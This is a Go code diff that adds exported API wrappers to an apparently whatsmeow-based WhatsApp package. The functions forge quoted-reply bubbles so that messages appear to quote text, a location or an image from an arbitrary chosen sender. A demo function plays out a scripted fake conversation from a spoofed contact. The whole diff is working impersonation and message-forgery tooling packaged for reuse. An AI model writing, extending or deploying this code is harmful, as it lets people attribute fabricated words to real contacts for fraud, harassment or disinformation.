@@ -2,6 +2,7 @@ package whatsapp
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"os"
 	"time"
@@ -224,4 +225,78 @@ func sendSpoofedTalkDemo(chatJID types.JID, spoofedJID types.JID, toGender strin
 	}
 	sendSpoofedReplyLocation(chatJID, spoofedJID, client.GenerateMessageID(), msgmap[language]["generic"][6])
 	logger.Infof("spoofed msg sended to %s from %s", chatJID.String(), spoofedJID.String())
+}
+
+// ── Exported API wrappers ─────────────────────────────────────────────────────
+
+// SpoofReply sends a text message where the quoted bubble shows a fake sender and fake quoted text.
+func SpoofReply(chatJID, fromJID types.JID, msgID, quotedText, text string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
+	return sendSpoofedReplyMessage(chatJID, fromJID, msgID, quotedText, text)
+}
+
+// SpoofReplyPrivate sends a spoofed reply in the private DM of fromJID.
+func SpoofReplyPrivate(chatJID, fromJID types.JID, msgID, quotedText, text string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
+	return sendSpoofedReplyMessageInPrivate(chatJID, fromJID, msgID, quotedText, text)
+}
+
+// SpoofReplyLocation sends a text message where the quoted bubble is a hardcoded spoofed location.
+func SpoofReplyLocation(chatJID, fromJID types.JID, msgID, text string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
+	return sendSpoofedReplyLocation(chatJID, fromJID, msgID, text)
+}
+
+// SpoofReplyImg sends a text message where the quoted bubble shows an image from a spoofed sender.
+// imgData is the raw image bytes (JPEG, PNG, etc.).
+func SpoofReplyImg(chatJID, fromJID types.JID, msgID string, imgData []byte, quotedText, text string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
+	uploaded, err := client.Upload(context.Background(), imgData, whatsmeow.MediaImage)
+	if err != nil {
+		return &waE2E.Message{}, &whatsmeow.SendResponse{}, fmt.Errorf("upload failed: %w", err)
+	}
+	msg := &waE2E.Message{
+		ExtendedTextMessage: &waE2E.ExtendedTextMessage{
+			Text:        proto.String(text),
+			PreviewType: waE2E.ExtendedTextMessage_IMAGE.Enum(),
+			ContextInfo: &waE2E.ContextInfo{
+				StanzaID:    proto.String(msgID),
+				Participant: proto.String(fromJID.String()),
+				QuotedMessage: &waE2E.Message{
+					ImageMessage: &waE2E.ImageMessage{
+						Caption:              proto.String(quotedText),
+						URL:                  proto.String(uploaded.URL),
+						DirectPath:           proto.String(uploaded.DirectPath),
+						MediaKey:             uploaded.MediaKey,
+						Mimetype:             proto.String(http.DetectContentType(imgData)),
+						FileEncSHA256:        uploaded.FileEncSHA256,
+						FileSHA256:           uploaded.FileSHA256,
+						FileLength:           proto.Uint64(uint64(len(imgData))),
+						JPEGThumbnail:        imgData,
+						Height:               proto.Uint32(100),
+						Width:                proto.Uint32(100),
+						MidQualityFileSHA256: uploaded.FileSHA256,
+					},
+				},
+			},
+		},
+	}
+	return sendMessage(chatJID, msg)
+}
+
+// SendTimedMessage sends a self-destructing message (60-second expiration).
+func SendTimedMessage(chatJID types.JID, text string) (*waE2E.Message, *whatsmeow.SendResponse, error) {
+	return sendTimedMsg(chatJID, text)
+}
+
+// SpoofDemo runs a pre-scripted fake conversation sequence.
+// gender: "boy" or "girl"; language: "br" or "en"; imgData: optional image bytes.
+func SpoofDemo(chatJID, spoofedJID types.JID, gender, language string, imgData []byte) {
+	spoofedFile := ""
+	if len(imgData) > 0 {
+		f, err := os.CreateTemp("", "spoofimg-*.jpg")
+		if err == nil {
+			_, _ = f.Write(imgData)
+			f.Close()
+			spoofedFile = f.Name()
+			defer os.Remove(spoofedFile)
+		}
+	}
+	sendSpoofedTalkDemo(chatJID, spoofedJID, gender, language, spoofedFile)
 }
